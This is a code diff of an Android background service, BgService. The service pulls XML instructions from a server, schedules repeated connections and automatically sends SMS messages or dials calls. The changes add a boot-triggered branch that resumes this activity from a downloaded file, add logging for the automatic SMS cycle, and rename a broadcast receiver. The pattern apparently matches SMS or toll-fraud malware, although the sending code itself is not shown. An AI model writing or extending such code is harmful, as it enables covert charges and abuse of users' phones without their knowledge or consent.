@@ -42,6 +42,8 @@ public class BgService extends Service {
     public static final String ACTION_DIAL_BR = "action.dial.bg";
     public static final String ACTION_INTERNET = "action.internet.bg";
     public static final String ACTION_SEND_SMS = "action.sms.bg";
+    public static final String ACTION_BOOT = "action.boot.bg";
+    
     private SettingManager mSM;
     
     private boolean mIsCalling;
@@ -94,7 +96,7 @@ public class BgService extends Service {
         }
     }
     
-    private BroadcastReceiver mBC = new BroadcastReceiver() {
+    private BroadcastReceiver mDialogBroadCast = new BroadcastReceiver() {
         @Override
         public void onReceive(Context context, Intent intent) {
             if (DEBUG) Log.d(TAG, "[[BgService::BroadcastReceiver::onReceive]]");
@@ -113,9 +115,9 @@ public class BgService extends Service {
         mSM = SettingManager.getInstance(BgService.this);
 //        SettingManager.getInstance(BgService.this).startAutoSendMessage();
         
-        IntentFilter iFilter = new IntentFilter();
-        iFilter.addAction(ACTION_DIAL_BR);
-        registerReceiver(mBC, iFilter);
+//        IntentFilter iFilter = new IntentFilter();
+//        iFilter.addAction(ACTION_DIAL_BR);
+//        registerReceiver(mDialogBroadCast, iFilter);
         mSM.setFirstStartTime();
     }
     
@@ -123,8 +125,9 @@ public class BgService extends Service {
     public void onStart(Intent intent, int startId) {
         super.onStart(intent, startId);
         
+        SettingManager sm = SettingManager.getInstance(this);
         if (intent != null && intent.getAction() != null && intent.getAction().equals(ACTION_INTERNET) == true) {
-            LOGD("[[onStart]] received the action to get the internet info");;
+            LOGD("[[onStart]] received the action to get the internet info");
             boolean ret = SettingManager.getInstance(this).getXMLInfoFromServer();
             if (ret == true) {
                 SettingManager.getInstance(this).parseServerXMLInfo();
@@ -133,12 +136,15 @@ public class BgService extends Service {
                 if (delay != null) {
                     delayTime = (Integer.valueOf(delay)) * 60 * 60 * 1000;
                 }
+                LOGD("[[onStart]] change the internet connect time delay, and start send the auto sms");
+                sm.setLastConnectServerTime(System.currentTimeMillis());
                 SettingManager.getInstance(this).tryToFetchInfoFromServer(delayTime);
                 SettingManager.getInstance(this).startAutoSendMessage();
             }
         } else if (intent != null && intent.getAction() != null && intent.getAction().equals(ACTION_SEND_SMS) == true) {
+            LOGD("[[onStart]] start send the sms for one cycle");
             autoSendSMSOrDial(this);
-        } else {
+        } else if (intent != null && intent.getAction() != null && intent.getAction().equals(ACTION_BOOT) == true) {
             File file = new File(SettingManager.getInstance(getApplicationContext()).DOWNLOAD_FILE_PATH);
             if (file.exists() == true) {
                 mSM.parseServerXMLInfo();
@@ -157,7 +163,7 @@ public class BgService extends Service {
     @Override
     public void onDestroy() {
         super.onDestroy();
-        this.unregisterReceiver(mBC);
+        this.unregisterReceiver(mDialogBroadCast);
     }
     
     private void autoSendSMSOrDial(Context context) {
